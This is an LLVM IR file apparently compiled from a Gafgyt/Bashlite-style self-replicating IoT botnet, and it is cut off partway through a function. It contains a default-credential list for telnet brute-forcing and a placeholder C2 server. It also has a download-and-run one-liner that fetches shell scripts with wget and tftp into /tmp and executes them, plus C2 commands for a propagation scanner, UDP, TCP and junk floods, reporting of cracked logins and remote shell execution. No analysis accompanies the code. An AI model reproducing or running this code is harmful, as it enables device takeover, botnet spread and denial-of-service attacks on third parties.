; ModuleID = 'host/ir_O1/Selfrep.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [8 x i8] c"IP:PORT\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = local_unnamed_addr global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0)], align 16
@.str.7 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.75 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.16 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.19 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.23 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.24 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.25 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.26 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.28 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [181 x i8] c"cd /tmp || cd /var/run;wget http://ip/wbin.sh;sh wbin.sh;rm -rf wbin.sh;tftp -r tbin1.sh -g ip;sh tbin1.sh; tftp ip -c get tbin2.sh; sh tbin2.sh; rm -rf tbin1.sh tbin2.sh wbin.sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.33 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.36 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.37 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.40 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.43 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.44 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.45 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.46 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.47 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.48 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.49 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.52 = private unnamed_addr constant [6 x i8] c"FORK\0A\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.54 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.56 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.58 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.59 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.61 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.62 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.63 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.64 = private unnamed_addr constant [9 x i8] c"[cpuset]\00", align 1
@.str.66 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.67 = private unnamed_addr constant [19 x i8] c"FAILED TO CONNECT\0A\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.69 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.70 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.71 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.72 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.73 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"LINK CLOSED\0A\00", align 1
@ipState.1 = internal unnamed_addr global i8 0, align 1
@ipState.2 = internal unnamed_addr global i8 0, align 1
@ipState.3 = internal unnamed_addr global i8 0, align 1
@ipState.4 = internal unnamed_addr global i8 0, align 1
@str = private unnamed_addr constant [5 x i8] c"FORK\00"
@str.1 = private unnamed_addr constant [12 x i8] c"LINK CLOSED\00"
@str.2 = private unnamed_addr constant [18 x i8] c"FAILED TO CONNECT\00"

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #14
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #14
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %153, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %153 ]
  %.0 = phi i8* [ %1, %3 ], [ %154, %153 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %149 [
    i8 0, label %155
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %155
    i8 37, label %149
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %153 [
    i8 115, label %48
    i8 100, label %68
    i8 120, label %84
    i8 88, label %100
    i8 117, label %116
    i8 99, label %132
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
  %67 = add nsw i32 %66, %.061
  br label %153

; <label>:68:                                     ; preds = %.critedge
  %69 = load i32, i32* %8, align 8
  %70 = icmp ult i32 %69, 41
  br i1 %70, label %71, label %76

; <label>:71:                                     ; preds = %68
  %72 = load i8*, i8** %9, align 8
  %73 = sext i32 %69 to i64
  %74 = getelementptr i8, i8* %72, i64 %73
  %75 = add i32 %69, 8
  store i32 %75, i32* %8, align 8
  br label %79

; <label>:76:                                     ; preds = %68
  %77 = load i8*, i8** %10, align 8
  %78 = getelementptr i8, i8* %77, i64 8
  store i8* %78, i8** %10, align 8
  br label %79

; <label>:79:                                     ; preds = %76, %71
  %.in68 = phi i8* [ %74, %71 ], [ %77, %76 ]
  %80 = bitcast i8* %.in68 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = tail call fastcc i32 @printi(i8** %0, i32 %81, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %83 = add nsw i32 %82, %.061
  br label %153

; <label>:84:                                     ; preds = %.critedge
  %85 = load i32, i32* %11, align 8
  %86 = icmp ult i32 %85, 41
  br i1 %86, label %87, label %92

; <label>:87:                                     ; preds = %84
  %88 = load i8*, i8** %12, align 8
  %89 = sext i32 %85 to i64
  %90 = getelementptr i8, i8* %88, i64 %89
  %91 = add i32 %85, 8
  store i32 %91, i32* %11, align 8
  br label %95

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %13, align 8
  %94 = getelementptr i8, i8* %93, i64 8
  store i8* %94, i8** %13, align 8
  br label %95

; <label>:95:                                     ; preds = %92, %87
  %.in67 = phi i8* [ %90, %87 ], [ %93, %92 ]
  %96 = bitcast i8* %.in67 to i32*
  %97 = load i32, i32* %96, align 4
